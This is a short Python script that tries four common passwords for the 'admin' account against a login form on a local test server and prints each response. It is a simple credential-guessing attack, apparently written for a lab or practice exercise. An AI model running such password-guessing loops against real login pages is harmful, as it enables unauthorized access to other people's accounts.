import requests

url = "http://127.0.0.1:5000/login"

passwords = ["123", "admin", "1234", "password"]

for pwd in passwords:
    r = requests.post(url, data={
        "username": "admin",
        "password": pwd
    })

    print(f"Tried {pwd} -> {r.text}")